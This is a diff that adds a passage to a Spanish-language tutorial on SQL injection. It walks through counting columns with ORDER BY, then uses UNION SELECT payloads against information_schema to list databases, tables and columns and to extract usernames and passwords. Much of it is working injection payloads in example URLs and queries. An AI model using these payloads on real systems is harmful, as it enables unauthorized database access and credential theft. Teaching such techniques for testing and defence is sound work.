@@ -73,3 +73,55 @@ information_schema.tables > Muestra todas las tablas
 ```sql
 SELECT username,password FROM users WHERE category=Accessories' UNION SELECT username,password FROM users-- -
 ```
+<p align="center">
+  <img src="https://i.postimg.cc/Fs1s7nJQ/sql-ejemplo-bool.png" alt="sql"/>
+</p>
+---
+## Tipos de inyecciones y "paso a paso".
+
+##### 1.er Paso:
+### ' ORDER BY [num_columns]-- -
+
+Determina `' ORDER BY [num]-- -` el número de columnas en la tabla de la base de datos.
+<p align="center">
+  <img src="https://i.postimg.cc/N0GGQs8R/sqli.png" alt="sqli"/>
+</p>
++ Ejemplo.
+```url
+https://example.com/filter?category=gift' ORDER BY 1-- -
+https://example.com/filter?category=gift' ORDER BY 2-- -
+https://example.com/filter?category=gift' ORDER BY 3-- -
+https://example.com/filter?category=gift' ORDER BY 4-- -
+```
+<p align="center">
+  <img src="https://i.postimg.cc/W1tQcpBz/image.png" alt="sql"/>
+</p>
+**"Al obtener un error se sabe que el número anterior es el número de columnas."**
+##### 2.do Paso:
+
+### ' UNION SELECT [NULL x cant_columns]-- -
+<p align="center">
+  <img src="https://i.postimg.cc/76KsrqhX/imagen.png" alt="sql"/>
+</p>
+
+- Ejemplos
+1. Descubrir los nombres de las DB.
+```SQL
+SELECT * FROM tabla UNION SELECT schema_name,2,3,4 FROM information_schema.schemata;-- -;
+```
+2. Descubrir las tablas creadas dentro de cada DB.
+```SQL
+SELECT * FROM tabla UNION SELECT table_name,2,3,4 FROM information_schema.tables;-- -;
+```
+3. Descubrir las tablas dentro de una DB específica.
+```SQL
+SELECT * FROM tabla UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema='name_DB';-- -;
+```
+4. Ver las columnas de una tabla.
+```SQL
+SELECT * FROM tabla UNION SELECT column_name, 2, 3, 4 FROM information_schema.columns WHERE table_name='users' AND table_schema='name_DB';-- -;
+```
+5. Ver los datos dentro de una DB
+```SQL
+SELECT username,password FROM users UNION SELECT username,password FROM login.users;
+```
